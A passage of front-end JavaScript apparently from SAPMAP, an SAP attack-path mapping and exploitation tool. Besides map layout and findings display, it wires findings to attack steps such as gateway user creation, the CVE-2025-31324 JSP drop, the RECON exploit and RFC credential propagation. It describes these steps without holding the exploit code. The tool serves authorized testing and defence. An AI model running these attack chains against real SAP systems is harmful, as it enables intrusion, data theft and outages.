    const centerX = (minX + maxX) / 2;
    sccList.forEach((h, i) => {
      const totalW = (sccList.length - 1) * xSpacing;
      const xC = centerX - totalW / 2 + i * xSpacing;
      _loCenter((mapState.scc_nodes||{})[h], xC, sccYC);
    });
  });

  if (standaloneSccs.length) {
      // Reserve a column to the right of the laid-out SAP nodes, AFTER
      // accounting for any SCC we just colocated above (so we don't
      // collide with a same-IP SCC already placed there).
      let rightmost = _LO_MARGIN + rowWidth;
      Object.values(nodes).forEach(n => {
        if (n._x != null) rightmost = Math.max(rightmost, n._x + _LO_BOX_W);
      });
      Object.values(mapState.scc_nodes || {}).forEach(sn => {
        if (sn._x != null) rightmost = Math.max(rightmost, sn._x + _LO_BOX_W);
      });
      const sccX = rightmost + _LO_MARGIN + _LO_BOX_W / 2;
      standaloneSccs.forEach((h, i) => {
        const yC = _LO_MARGIN + btpTier + i * (_LO_BOX_H + _LO_MARGIN) + _LO_BOX_H / 2;
        _loCenter((mapState.scc_nodes||{})[h], sccX, yC);
      });
    }
  fitMap();
  updateMap();
}

function layoutByStack() {
  // Group nodes into clusters by system_type.  Each cluster gets its
  // own column; nodes within a cluster stack vertically.  Saproute
  // and unknown-stack nodes get their own columns at the right edge.
  // SCC (Cloud Connector) nodes are placed in a dedicated column too
  // so they don't stay at their stale previous coords.
  const sids = _loSortedNodeKeys();
  const sccHosts = Object.keys(mapState.scc_nodes || {}).sort();
  if (sids.length === 0 && sccHosts.length === 0) return;
  flashActivity('Rearranging: Group by Stack');
  const nodes = mapState.nodes;

  function bucketOf(n) {
    const t = (n.system_type || '').toUpperCase();
    if (t === 'SAPROUTER') return 'SAProuter';
    if (t.includes('ABAP') && t.includes('JAVA')) return 'ABAP+JAVA';
    if (t.includes('ABAP')) return 'ABAP';
    if (t.includes('JAVA')) return 'JAVA';
    return 'Other';
  }
  const order = ['ABAP', 'ABAP+JAVA', 'JAVA', 'SAProuter', 'SCC', 'Other'];
  const clusters = {};
  order.forEach(b => { clusters[b] = []; });
  sids.forEach(sid => {
    const b = bucketOf(nodes[sid]);
    if (!clusters[b]) clusters[b] = [];
    clusters[b].push(sid);
  });
  // SCC nodes live in their own bucket (keyed by host, not sid)
  sccHosts.forEach(h => { clusters['SCC'].push(h); });
  // Drop empty clusters; keep order
  const populated = order.filter(b => clusters[b].length > 0);
  const xSpacing = _LO_BOX_W + _LO_MARGIN * 2;
  const ySpacing = _LO_BOX_H + _LO_MARGIN;
  // Reserve a cloud-tier strip at the top for BTP subaccount nodes
  // so the on-prem stack columns don't end up underneath them.
  const btpTier = _loPlaceBtpTier(_LO_MARGIN, _LO_MARGIN);
  populated.forEach((b, colIdx) => {
    clusters[b].sort().forEach((id, rowIdx) => {
      const xC = _LO_MARGIN + colIdx * xSpacing + _LO_BOX_W / 2;
      const yC = _LO_MARGIN + 30 + btpTier + rowIdx * ySpacing + _LO_BOX_H / 2;
      const obj = (b === 'SCC')
        ? (mapState.scc_nodes || {})[id]
        : nodes[id];
      if (obj) _loCenter(obj, xC, yC);
    });
  });
  fitMap();
  updateMap();
}
function applyViewBox() {
  const vb = `${viewBox.x} ${viewBox.y} ${viewBox.w} ${viewBox.h}`;
  document.getElementById('map-svg').setAttribute('viewBox', vb);
  const pulseSvg = document.getElementById('pulse-svg');
  if (pulseSvg) pulseSvg.setAttribute('viewBox', vb);
}
function showAbout() {
  const body = `
<div style="padding:18px 22px;max-width:720px;line-height:1.55;color:#c9d1d9">
  <h2 style="margin:0 0 8px 0;color:#e6edf3">&#9889; SAPMAP</h2>
  <div style="color:#8b949e;font-size:12px;margin-bottom:18px">
    SAP Landscape Attack-Path Mapper — offensive/defensive recon,
    credential propagation, and data-extraction toolkit for SAP
    NetWeaver ABAP &amp; Java stacks.
  </div>

  <h3 style="color:#f85149;margin:0 0 6px 0">&#9888;&#65039; Disclaimer</h3>
  <div style="background:#161b22;border:1px solid #30363d;
               border-radius:6px;padding:12px 14px;font-size:13px">
    <p style="margin:0 0 10px 0"><b>Use at your own risk.</b>
      SAPMAP implements real, working exploits against SAP systems.
      Running it against a system you do not own or do not have
      explicit written permission to test is <b>illegal</b> in most
      jurisdictions and can result in data loss, system outages,
      locked accounts, or audit findings.</p>

    <p style="margin:0 0 10px 0">This tool is intended <b>solely</b>
      for:</p>
    <ul style="margin:0 0 10px 18px;padding:0">
      <li>authorized penetration tests and red-team engagements,</li>
      <li>defensive security research on systems you own or
          administer,</li>
      <li>educational study of SAP attack surfaces, and</li>
      <li>SOC / blue-team detection-engineering exercises.</li>
    </ul>

    <p style="margin:0 0 10px 0">You are responsible for:</p>
    <ul style="margin:0 0 10px 18px;padding:0">
      <li>having written authorization before running any scan,
          check, or exploit against a system,</li>
      <li>the consequences of any action you take with this tool,</li>
      <li>cleaning up artifacts (SAPMAP00 users, dropped JSPs, TCP/IP
          destinations) when you are done — see Actions &rarr;
          Cleanup All Users.</li>
    </ul>

    <p style="margin:0"><b>No warranty.</b> SAPMAP is provided
      "as is", without warranty of any kind, express or implied.
      The authors accept no liability for any damage caused by
      its use or misuse.</p>
  </div>

  <div style="margin-top:16px;font-size:12px;color:#8b949e">
    Source: <a href="https://github.com/OWASP/SAPMAP"
                target="_blank"
                style="color:#58a6ff">github.com/OWASP/SAPMAP</a>
    &nbsp;·&nbsp; Report issues, PRs welcome.
  </div>

  <div style="text-align:right;margin-top:18px">
    <button class="btn btn-primary"
            onclick="document.getElementById('about-modal').remove()">
      I understand
    </button>
  </div>
</div>`;
  // Remove any existing modal first (in case user clicks twice)
  const existing = document.getElementById('about-modal');
  if (existing) existing.remove();
  const m = document.createElement('div');
  m.id = 'about-modal';
  m.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.65);'
    + 'z-index:10000;display:flex;align-items:center;justify-content:center;';
  m.innerHTML = '<div style="background:#0d1117;border:1px solid #30363d;'
    + 'border-radius:10px;box-shadow:0 8px 40px rgba(0,0,0,.6);max-width:760px">'
    + body + '</div>';
  m.addEventListener('click', (e) => { if (e.target === m) m.remove(); });
  document.body.appendChild(m);
}

function toggleConsole() {
  const c = document.getElementById('console-container');
  const r = document.getElementById('console-restore');
  const rz = document.getElementById('console-resizer');
  const hidden = c.style.display === 'none';
  c.style.display = hidden ? 'flex' : 'none';
  r.style.display = hidden ? 'none' : 'block';
  if (rz) rz.style.display = hidden ? 'block' : 'none';
  // If we were maximized, restore map/legend when minimizing
  if (!hidden && consoleMaximized) {
    c.style.height = '180px';
    c.style.flex = '';
    document.getElementById('console-body').style.overflow = '';
    document.getElementById('map-container').style.display = '';
    document.getElementById('legend-bar').style.display = '';
    consoleMaximized = false;
  }
}
function toggleToolbar() {
  const t = document.getElementById('toolbar');
  t.style.display = t.style.display === 'none' ? 'flex' : 'none';
}

// --- Drag & Pan ---
function _getDragTarget(sid) {
  if (sid.startsWith('unk:')) return unkPositions[sid.slice(4)];
  if (sid.startsWith('scc:')) return (mapState.scc_nodes || {})[sid.slice(4)];
  if (sid.startsWith('btp:')) return (mapState.btp_subaccounts || {})[sid.slice(4)];
  // tms:<source_sid>:<target_sid>:<domain> — CTS/TMS cylinders
  if (sid.startsWith('tms:')) {
    const parts = sid.split(':');
    if (parts.length < 4) return null;
    const posKey = 'tms:' + parts[1] + '|' + parts[2] + '|' + parts[3];
    if (!tmsPositions[posKey]) {
      const src = mapState.nodes[parts[1]];
      const dest = src && (src.tms_destinations || []).find(
        d => d.target_sid === parts[2] && d.domain === parts[3]);
      if (dest && dest._x !== undefined) {
        tmsPositions[posKey] = { _x: dest._x, _y: dest._y };
      }
    }
    return tmsPositions[posKey] || null;
  }
  // dbcon:<source_sid>:<con_name> — issue #21 DBCON cylinders.
  // Return the client-side position dict (mirrors unkPositions),
  // NOT the edge object on mapState.nodes.dbcon_edges — the latter
  // is replaced on every state poll and would lose the drag.
  if (sid.startsWith('dbcon:')) {
    const rest = sid.slice(6);
    const colonIdx = rest.indexOf(':');
    if (colonIdx < 0) return null;
    const srcSid = rest.slice(0, colonIdx);
    const conName = rest.slice(colonIdx + 1);
    const posKey = srcSid + '|' + conName;
    if (!dbconPositions[posKey]) {
      // First-time drag before render seeded it — synthesise from
      // the live edge if present.
      const src = mapState.nodes[srcSid];
      const edge = src && (src.dbcon_edges || []).find(
        x => x.con_name === conName);
      if (edge && edge._x !== undefined) {
        dbconPositions[posKey] = { _x: edge._x, _y: edge._y };
      }
    }
    return dbconPositions[posKey] || null;
  }
  return mapState.nodes[sid];
}
function startDrag(e, sid) {
  if (e.button === 2) return; // right-click = context menu
  e.stopPropagation();
  dragNode = sid;
  dragMoved = false;
  dragStartPos.x = e.clientX;
  dragStartPos.y = e.clientY;
  const n = _getDragTarget(sid);
  if (!n) return;
  const svg = document.getElementById('map-svg');
  const pt = svg.createSVGPoint();
  pt.x = e.clientX; pt.y = e.clientY;
  const svgPt = pt.matrixTransform(svg.getScreenCTM().inverse());
  dragOffset.x = svgPt.x - (n._x || 0);
  dragOffset.y = svgPt.y - (n._y || 0);
}

function updateStatusBar() {
  const s = mapState.stats || {};
  // Fallback sums SAP + SCC + BTP node maps so the count matches the
  // number of boxes on the map even if s.systems is missing.
  const fallbackSystems = Object.keys(mapState.nodes||{}).length
                        + Object.keys(mapState.scc_nodes||{}).length
                        + Object.keys(mapState.btp_subaccounts||{}).length;
  document.getElementById('st-systems').textContent =
      (s.systems !== undefined ? s.systems : fallbackSystems);
  document.getElementById('st-connections').textContent = s.connections || (mapState.connections||[]).length;
  document.getElementById('st-pwned').textContent = s.pwned || 0;
  document.getElementById('st-users').textContent = s.users_created || 0;
}

// Keep the last-shown activity visible for a short grace period after
// the task completes, so fast steps don't flash by too quickly to read.
// A brand-new activity overrides the grace window immediately.
const _ACTIVITY_HOLD_MS = 3000;
const _FLASH_HOLD_MS    = 3000;
let _activityHideTimer = null;

// Client-side "flash" activities — synchronous or purely-UI actions
// that aren't tracked by the server's active_tasks map (e.g. layout
// changes, set_credentials, add_system).  Each entry auto-expires.
// Shape: {id → {label, expiresAt}}
const _flashActivities = {};
let _flashCounter = 0;

function flashActivity(label, holdMs) {
  const id = 'f' + (++_flashCounter);
  _flashActivities[id] = {
    label: label || 'Working',
    expiresAt: Date.now() + (holdMs || _FLASH_HOLD_MS),
  };
  updateActivityBar();
  // Schedule re-render right when this flash expires
  setTimeout(updateActivityBar, (holdMs || _FLASH_HOLD_MS) + 50);
}

function _collectFlashLabels() {
  const now = Date.now();
  const seen = new Set();
  const out = [];
  for (const id in _flashActivities) {
    if (_flashActivities[id].expiresAt <= now) {
      delete _flashActivities[id];
      continue;
    }
    const label = _flashActivities[id].label;
    if (seen.has(label)) continue;
    seen.add(label);
    out.push(label);
  }
  return out;
}

function updateActivityBar() {
  const bar = document.getElementById('activity-bar');
  const keys = Object.keys(activeTasks);
  const flashes = _collectFlashLabels();

  if (keys.length > 0 || flashes.length > 0) {
    const parts = [];
    for (const key of keys) {
      const label = activeTasks[key];
      const colonIdx = key.indexOf(':');
      const sid = colonIdx > 0 && !key.startsWith('_') ? key.substring(0, colonIdx) : '';
      parts.push(sid ? `${sid}: ${label}` : label);
    }
    parts.push(...flashes);
    const text = parts.join(' | ');
    if (_activityHideTimer) { clearTimeout(_activityHideTimer); _activityHideTimer = null; }
    document.getElementById('activity-text').textContent = text;
    bar.classList.add('active');
    return;
  }

  if (!bar.classList.contains('active')) return;
  if (_activityHideTimer) return;
  _activityHideTimer = setTimeout(() => {
    _activityHideTimer = null;
    if (Object.keys(activeTasks).length === 0 &&
        _collectFlashLabels().length === 0) {
      bar.classList.remove('active');
    }
  }, _ACTIVITY_HOLD_MS);
}

function _nodeHasActiveTask(sid) {
  for (const key in activeTasks) {
    if (key === sid + ':' || key.startsWith(sid + ':')) return true;
  }
  return false;
}

// Count undismissed findings scoped to a given node SID, and record the
// worst severity so the map badge can pick a colour without scanning
// twice.  Banner auto-dismiss (after 5 s) DOES decay these — the badge
// is "unresolved attention", not "lifetime count".
const _SEV_RANK = { CRITICAL: 4, HIGH: 3, MEDIUM: 2, INFO: 1 };
function _nodeFindingCount(sid) {
  let count = 0, worstRank = 0, worst = '';
  for (const f of _activeFindings) {
    if (f.node !== sid) continue;
    if (_dismissedFindingIds.has(f.id)) continue;
    count++;
    const r = _SEV_RANK[f.severity] || 0;
    if (r > worstRank) { worstRank = r; worst = f.severity; }
  }
  return { count, worst };
}

// ---------------------------------------------------------------
// Findings banner + drawer + bell
// ---------------------------------------------------------------
// Only CRITICAL/HIGH surface as live banner rows above the map.
// MEDIUM/INFO still go to the drawer + console but don't grab the
// full-width attention grabber.
const _BANNER_SEVERITIES = { CRITICAL: true, HIGH: true, INFO: true };
const _SEV_LABEL = {
  CRITICAL: 'CRITICAL', HIGH: 'HIGH', MEDIUM: 'MEDIUM', INFO: 'INFO',
};

function _escapeHtml(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function _findingNextStep(f) {
  if (!f || !f.node) return '';
  const sid = f.node;
  const n = (mapState.nodes || {})[sid];
  if (!n) return '';
  const msg = (f.msg || '').toLowerCase();
  const cve = (f.cve || '').toUpperCase();
  if (msg.includes('gateway vulnerable') || msg.includes('sapxpg')) {
    if (!n.pwned) return {label: 'Create User via GW', action: 'create_user_gw'};
  }
  if (msg.includes('message server') && msg.includes('vulnerable') || msg.includes('betrusted')) {
    if (!n.pwned) return {label: 'Betrusted Chain', action: 'create_user_betrusted'};
  }
  if (cve === 'CVE-2025-31324' || msg.includes('metadatauploader') || msg.includes('31324')) {
    if (!n.pwned) return {label: 'Exploit CVE-2025-31324', action: 'exploit_cve_31324_drop'};
  }
  if (cve === 'CVE-2020-6287' || msg.includes('recon') && msg.includes('vulnerable')) {
    if (!n.pwned) return {label: 'Create User (RECON)', action: 'create_user_java'};
  }
  if (msg.includes('user created') || msg.includes('pwned')) {
    const sysType = ((n.system_type || '') + '').toUpperCase();
    if (sysType.indexOf('ABAP') !== -1)
      return {label: 'Retrieve RFCs', action: 'retrieve_rfcs'};
  }
  if (msg.includes('rfc destinations') && msg.includes('retrieved')) {
    return {label: 'Test RFCs', action: 'test_rfcs'};
  }
  if (msg.includes('rfc') && msg.includes('reachable')) {
    return {label: 'Propagate', action: 'propagate'};
  }
  return '';
}

function renderFindings() {
  const bar = document.getElementById('findings-bar');
  const bell = document.getElementById('findings-bell');
  const badge = document.getElementById('findings-badge');
  const drawerBody = document.getElementById('findings-drawer-body');
  if (!bar || !bell || !badge || !drawerBody) return;

  // --- Banner: only undismissed CRITICAL/HIGH, newest first, cap at 5 ---
  const bannerRows = [];
  for (let i = _activeFindings.length - 1; i >= 0 && bannerRows.length < 5; i--) {
    const f = _activeFindings[i];
    if (_dismissedFindingIds.has(f.id)) continue;
    if (_bannerHiddenIds.has(f.id)) continue;
    if (!_BANNER_SEVERITIES[f.severity]) continue;
    bannerRows.push(f);
  }
  // Reverse so the newest toast sits at the bottom of the stack (nearest
  // the bottom-right corner), matching standard toast-notification UX.
  bar.innerHTML = bannerRows.slice().reverse().map(f => {
    const sev = _SEV_LABEL[f.severity] || 'INFO';
    const node = _escapeHtml(f.node || '?');
    const nodeClick = f.node
      ? ` onclick="focusFindingNode('${_escapeHtml(f.node)}')"`
      : '';
    const cve = f.cve
      ? ` <span class="finding-cve">${_escapeHtml(f.cve)}</span>` : '';
    const nextStep = _findingNextStep(f);
    const nextHtml = nextStep
      ? ` <span class="finding-action" onclick="selectedNodeSid='${_escapeHtml(f.node)}';ctxAction('${nextStep.action}')">${nextStep.label} →</span>`
      : '';
    return `<div class="finding-row sev-${sev}">`
      + `<span class="finding-sev">${sev}</span>`
      + `<span class="finding-node"${nodeClick}>${node}</span>`
      + `<span class="finding-msg">${_escapeHtml(f.msg)}</span>${cve}${nextHtml}`
      + `<span class="finding-dismiss" title="Dismiss"`
      + ` onclick="dismissFinding(${f.id})">&times;</span>`
      + `</div>`;
  }).join('');

  // --- Bell badge + glow state ---
  let undismissedCrit = 0, undismissedHigh = 0, totalUndismissed = 0;
  for (const f of _activeFindings) {
    if (_dismissedFindingIds.has(f.id)) continue;
    totalUndismissed++;
    if (f.severity === 'CRITICAL') undismissedCrit++;
    else if (f.severity === 'HIGH') undismissedHigh++;
  }
  badge.textContent = String(totalUndismissed);
  badge.classList.toggle('show', totalUndismissed > 0);
  bell.classList.toggle('has-critical', undismissedCrit > 0);
  bell.classList.toggle('has-high', undismissedCrit === 0 && undismissedHigh > 0);

  // --- Drawer body: full history, newest first, honouring filters ---
  const fltEnabled = {
    CRITICAL: document.getElementById('fflt-crit')?.checked !== false,
    HIGH:     document.getElementById('fflt-high')?.checked !== false,
    MEDIUM:   document.getElementById('fflt-med')?.checked  !== false,
    INFO:     document.getElementById('fflt-info')?.checked !== false,
  };
  const nodeFilter = (document.getElementById('fflt-node')?.value || '')
    .trim().toLowerCase();
  const visible = _activeFindings.filter(f => {
    if (!fltEnabled[f.severity]) return false;
    if (nodeFilter && !(f.node || '').toLowerCase().includes(nodeFilter))
      return false;
    return true;
  });
  if (visible.length === 0) {
    drawerBody.innerHTML = '<div style="color:#6e7681;padding:20px;'
      + 'text-align:center">No findings match the current filter</div>';
  } else {
    const rows = [];
    for (let i = visible.length - 1; i >= 0; i--) {
      const f = visible[i];
      const sev = _SEV_LABEL[f.severity] || 'INFO';
      const ts = new Date((f.ts || 0) * 1000);
      const hh = String(ts.getHours()).padStart(2, '0');
      const mm = String(ts.getMinutes()).padStart(2, '0');
      const ss = String(ts.getSeconds()).padStart(2, '0');
      const dismissed = _dismissedFindingIds.has(f.id);
      const nodeClick = f.node
        ? ` onclick="focusFindingNode('${_escapeHtml(f.node)}')"`
        : '';
      rows.push(
        `<div class="finding-log-row sev-${sev}"`
          + (dismissed ? ' style="opacity:0.55"' : '')
          + `>`
        + `<span style="color:#6e7681;font-size:10px;margin-right:6px">`
          + `${hh}:${mm}:${ss}</span>`
        + `<span class="finding-sev">${sev}</span>`
        + `<span class="finding-node"${nodeClick}>`
          + `${_escapeHtml(f.node || '?')}</span>`
        + `<span class="finding-msg">${_escapeHtml(f.msg)}</span>`
        + (f.cve
            ? `<span class="finding-cve">${_escapeHtml(f.cve)}</span>` : '')
        + ((f.attack_techniques && f.attack_techniques.length)
            ? renderAttackPills(f.attack_techniques, {max: 3}) : '')
        + ((f.remediation && typeof f.remediation === 'object' && f.remediation.fix_summary)
            ? `<span class="finding-fix" title="${_escapeHtml(f.remediation.fix_summary)}">&#10004; ${_escapeHtml(f.remediation.fix_summary)}</span>`
            : '')
        + `</div>`
      );
    }
    drawerBody.innerHTML = rows.join('');
  }
}

function dismissFinding(id) {
  _dismissedFindingIds.add(id);
  renderFindings();
  try { updateMap(); } catch (_) {}
}

function copyFindingsMarkdown() {
  if (_activeFindings.length === 0) {
    try { showToast('No findings to copy'); } catch (_) {}
    return;
  }
  const lines = ['# SAPMAP session findings', ''];
  lines.push(`_${_activeFindings.length} event(s), newest first_`, '');
  for (let i = _activeFindings.length - 1; i >= 0; i--) {
    const f = _activeFindings[i];
    const ts = new Date((f.ts || 0) * 1000).toISOString();
    const cve = f.cve ? ` [${f.cve}]` : '';
    lines.push(`- **${f.severity}** ${ts} · \`${f.node || '?'}\` — `
               + `${f.msg}${cve}`);
  }
  const md = lines.join('\n');
  try {
    navigator.clipboard.writeText(md);
    showToast(`Copied ${_activeFindings.length} finding(s) as markdown`);
  } catch (e) {
    try { showToast('Clipboard blocked: ' + e); } catch (_) {}
  }
}

function toggleFindingsDrawer() {
  _findingsDrawerOpen = !_findingsDrawerOpen;
  const d = document.getElementById('findings-drawer');
  if (d) d.classList.toggle('open', _findingsDrawerOpen);
}

// ---------------------------------------------------------------------------
// Pulse overlay — when a finding fires, briefly light up the relevant node
// box (and, for SAP_ALL / credentialed connections, the edge between two
// nodes).  Uses short-lived SVG elements with native <animate> children so
// they self-destroy when the animation ends and survive map innerHTML
// rebuilds (the pulse layer is a sibling <svg>).
// ---------------------------------------------------------------------------
const _PULSE_COLORS = {
  CRITICAL: '#ff4d4d',
  HIGH:     '#f0883e',
  MEDIUM:   '#d29922',
  INFO:     '#388bfd',
};

function _getNodeCenter(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n || n._x == null) return null;
  const BOX_W = 240, BOX_H = 174;
  return { x: n._x, y: n._y, w: BOX_W, h: BOX_H,
           cx: n._x + BOX_W / 2, cy: n._y + BOX_H / 2 };
}

function _pulseNode(sid, severity) {
  const pulse = document.getElementById('pulse-svg');
  if (!pulse) return;
  const pos = _getNodeCenter(sid);
  if (!pos) return;
  const color = _PULSE_COLORS[severity] || _PULSE_COLORS.INFO;
  const svgNS = 'http://www.w3.org/2000/svg';
  // Border rect: starts flush with the node, expands outward while fading.
  const pad = 4;
  const rect = document.createElementNS(svgNS, 'rect');
  rect.setAttribute('x', pos.x - pad);
  rect.setAttribute('y', pos.y - pad);
  rect.setAttribute('width', pos.w + pad * 2);
  rect.setAttribute('height', pos.h + pad * 2);
  rect.setAttribute('rx', 8);
  rect.setAttribute('fill', 'none');
  rect.setAttribute('stroke', color);
  rect.setAttribute('stroke-width', 4);
  rect.setAttribute('opacity', 0.9);
  // Expanding stroke + fading opacity, 3 cycles over ~2.4s.
  rect.innerHTML =
    `<animate attributeName="stroke-width" values="3;10;3" ` +
        `dur="0.8s" repeatCount="3" />` +
    `<animate attributeName="opacity" values="0.9;0.2;0.9" ` +
        `dur="0.8s" repeatCount="3" />`;
  pulse.appendChild(rect);
  setTimeout(() => rect.remove(), 2500);
}

function _pulseConnection(srcSid, tgtSid, severity) {
  const pulse = document.getElementById('pulse-svg');
  if (!pulse) return;
  const a = _getNodeCenter(srcSid);
  const b = _getNodeCenter(tgtSid);
  if (!a || !b) return;
  const color = _PULSE_COLORS[severity] || _PULSE_COLORS.CRITICAL;
  const svgNS = 'http://www.w3.org/2000/svg';
  // Straight line between box centers — the real edge may be curved, but
  // a thick pulsing overlay at center-to-center reads clearly as "this
  // connection just lit up" without duplicating clip/curve math.
  const line = document.createElementNS(svgNS, 'line');
  line.setAttribute('x1', a.cx);
  line.setAttribute('y1', a.cy);
  line.setAttribute('x2', b.cx);
  line.setAttribute('y2', b.cy);
  line.setAttribute('stroke', color);
  line.setAttribute('stroke-width', 4);
  line.setAttribute('stroke-linecap', 'round');
  line.setAttribute('opacity', 0.85);
  line.innerHTML =
    `<animate attributeName="stroke-width" values="3;12;3" ` +
        `dur="0.7s" repeatCount="3" />` +
    `<animate attributeName="opacity" values="0.85;0.15;0.85" ` +
        `dur="0.7s" repeatCount="3" />`;
  pulse.appendChild(line);
  // Also light up both endpoints so the eye is drawn to them too.
  _pulseNode(srcSid, severity);
  _pulseNode(tgtSid, severity);
  setTimeout(() => line.remove(), 2200);
}

function _maybePulseFromFinding(rec) {
  if (!rec || !rec.node) return;
  const sev = rec.severity || 'INFO';
  const meta = rec.meta || {};
  if (meta.source_sid && meta.target_sid) {
    _pulseConnection(meta.source_sid, meta.target_sid, sev);
  } else {
    _pulseNode(rec.node, sev);
  }
}

// Request Notification permission lazily on first scan start so the
// browser only prompts when the feature is actually about to be used.
let _notifPermissionAsked = false;
function _maybeAskNotifPermission() {
  if (_notifPermissionAsked) return;
  _notifPermissionAsked = true;
  if (typeof Notification === 'undefined') return;
  if (Notification.permission === 'default') {
    try { Notification.requestPermission(); } catch (_) {}
  }
}
function _maybeNotifyDesktop(rec) {
  if (typeof Notification === 'undefined') return;
  if (Notification.permission !== 'granted') return;
  // Only pop when the window isn't the active tab — otherwise the
  // banner + drawer + console are already visible.
  if (!document.hidden && document.hasFocus && document.hasFocus()) return;
  try {
    const n = new Notification('SAPMAP: CRITICAL — ' + (rec.node || '?'), {
      body: rec.msg || '',
      tag: 'sapmap-' + rec.id,
      silent: false,
    });
    n.onclick = () => { try { window.focus(); } catch (_) {} n.close(); };
  } catch (_) { /* some browsers throw on rapid creation */ }
}

function focusFindingNode(sid) {
  if (!sid || sid === '?') return;
  // If the SID is mapped, open its details panel.  If it's just a
  // host/IP (no node yet), fall back to flashing the activity bar.
  if (mapState.nodes && mapState.nodes[sid]) {
    try { showDetails(sid); } catch (_) {}
    return;
  }
  try { flashActivity('Focus: ' + sid); } catch (_) {}
}

// --- Global event listeners ---
document.addEventListener('mousemove', e => {
  if (dragNode) {
    const dx = e.clientX - dragStartPos.x, dy = e.clientY - dragStartPos.y;
    if (dx*dx + dy*dy > 9) dragMoved = true;  // 3px threshold
    const svg = document.getElementById('map-svg');
    const pt = svg.createSVGPoint();
    pt.x = e.clientX; pt.y = e.clientY;
    const svgPt = pt.matrixTransform(svg.getScreenCTM().inverse());
    const dt = _getDragTarget(dragNode);
    if (dt) { dt._x = svgPt.x - dragOffset.x; dt._y = svgPt.y - dragOffset.y; }
    updateMap();
  } else if (isPanning) {
    viewBoxUserControlled = true;
    const svg = document.getElementById('map-svg');
    const scale = viewBox.w / svg.clientWidth;
    viewBox.x -= (e.clientX - panStart.x) * scale;
    viewBox.y -= (e.clientY - panStart.y) * scale;
    panStart.x = e.clientX; panStart.y = e.clientY;
    applyViewBox();
  }
});

document.addEventListener('mouseup', () => {
  if (dragNode && !dragMoved
      && !dragNode.startsWith('unk:')
      && !dragNode.startsWith('scc:')
      && !dragNode.startsWith('btp:')
      && !dragNode.startsWith('dbcon:')
      && !dragNode.startsWith('tms:')) showDetails(dragNode);
  // Mark drag-targeted DBCON/TMS positions as pinned so the auto-
  // reposition-on-collision logic in the render loop leaves them
  // alone.  Only fires when the user actually moved the cursor
  // (dragMoved), so a single-click on the accessory doesn't lock
  // its position.
  if (dragNode && dragMoved) {
    if (dragNode.startsWith('dbcon:')) {
      const rest = dragNode.slice(6);
      const colonIdx = rest.indexOf(':');
      if (colonIdx > 0) {
        const pk = rest.slice(0, colonIdx) + '|' + rest.slice(colonIdx + 1);
        if (dbconPositions[pk]) dbconPositions[pk].pinned = true;
      }
    } else if (dragNode.startsWith('tms:')) {
      // tms drag id is 'tms:<sid>:<target>:<domain>' — but the pos key
      // is 'tms:<sid>|<target>|<domain>'.  Reconstruct.
      const parts = dragNode.split(':');
      if (parts.length >= 4) {
        const pk = 'tms:' + parts[1] + '|' + parts[2] + '|' + parts[3];
        if (tmsPositions[pk]) tmsPositions[pk].pinned = true;
      }
    }
  }
  dragNode = null; isPanning = false;
});

document.getElementById('map-container').addEventListener('mousedown', e => {
  if (e.target === document.getElementById('map-svg') || e.target === document.getElementById('map-container')) {
    isPanning = true; panStart.x = e.clientX; panStart.y = e.clientY;
  }
});

document.getElementById('map-container').addEventListener('wheel', e => {
  e.preventDefault();
  viewBoxUserControlled = true;
  const factor = e.deltaY > 0 ? 1.1 : 0.9;
  viewBox.w *= factor; viewBox.h *= factor;
  applyViewBox();
}, { passive: false });

document.addEventListener('click', e => {
  hideCtxMenu();
  hideSCCCtxMenu();
  hideBTPCtxMenu();
  hideTMSCtxMenu();
  hideDBCONCtxMenu();
  if (!e.target.closest('.info-panel') && !e.target.closest('.edge-line'))
    document.getElementById('info-panel').classList.remove('visible');
});

document.addEventListener('contextmenu', e => {
  const nodeBox = e.target.closest('.node-box');
  const mapSvg = document.getElementById('map-svg');
  const mapContainer = document.getElementById('map-container');
  hideCtxMenu();
  hideSCCCtxMenu();
  hideBTPCtxMenu();
  hideTMSCtxMenu();
  hideDBCONCtxMenu();
  hideMapCtxMenu();
  if (!nodeBox && (e.target === mapSvg || e.target === mapContainer ||
      mapSvg.contains(e.target) || mapContainer.contains(e.target))) {
    e.preventDefault();
    showMapCtxMenu(e);
  }
});

function showMapCtxMenu(e) {
  const menu = document.getElementById('map-ctx-menu');
  // Per-vulnerability gating: each "Check All XX" entry only shows
  // when there's at least one node on the map where the check is
  // meaningful (matching the per-node menu's gating rules).
  //
  // Hiding entries that wouldn't do anything keeps the menu compact
  // and prevents the operator from triggering no-op scans.
  const nodes = Object.values(mapState.nodes || {});

  // Has any node with a gateway port (33XX) — needed for GW vuln check.
  const hasAnyGwPort = nodes.some(n =>
    (n.instances || []).some(i =>
      Object.entries(i.ports || {}).some(([p, s]) =>
        s === 'gateway' || (Number(p) >= 3300 && Number(p) <= 3399))));
  // Has any node with a message-server internal port (39XX) — needed
  // for 10KBlaze / MS betrusted (CVE-2020-6207) check.
  //
  // CRITICAL: gate on the instance ports DICT, not on `n.ms_port`.
  // `n.ms_port` only gets populated AFTER the MS betrusted check has
  // ALREADY RUN successfully against the node - so gating on it
  // creates a chicken-and-egg trap: the menu hides the check that
  // would populate the field that the menu uses to decide whether
  // to show the check.
  //
  // Operator-reported regression: S4H had port 3901 in
  // n.instances[0].ports (visible in the node-box and discovered by
  // standard scan), but "Check All 10KBlaze" was hidden because
  // `n.ms_port` was 0 (operator hadn't run check_ms_betrusted yet).
  //
  // Mirror the GW gating pattern: walk the instance.ports dict for
  // ports 3900-3999 (or the explicit "ms_internal" service tag).
  // Either signal means "this node has the kind of port the
  // 10KBlaze check would probe", which is what the operator needs
  // to know before running the sweep.
  const hasAnyMsPort = nodes.some(n =>
    (n.instances || []).some(i =>
      Object.entries(i.ports || {}).some(([p, s]) =>
        s === 'ms_internal' || (Number(p) >= 3900 && Number(p) <= 3999))));
  // Has any Java / double-stack node — needed for CVE-2025-31324
  // (VisualComposer JSP unauth) and CVE-2020-6287 (RECON).
  const hasAnyJava = nodes.some(n =>
    ((n.system_type || '').toUpperCase().indexOf('JAVA') !== -1));
  // Has any ABAP/Java/WD node — needed for CVE-2022-22536 (ICMAD).
  // The check probes HTTP ACL bypass via Content-Length smuggling,
  // applicable to any SAP HTTP-serving stack.
  const hasAnyHttp = nodes.some(n => {
    const st = (n.system_type || '').toUpperCase();
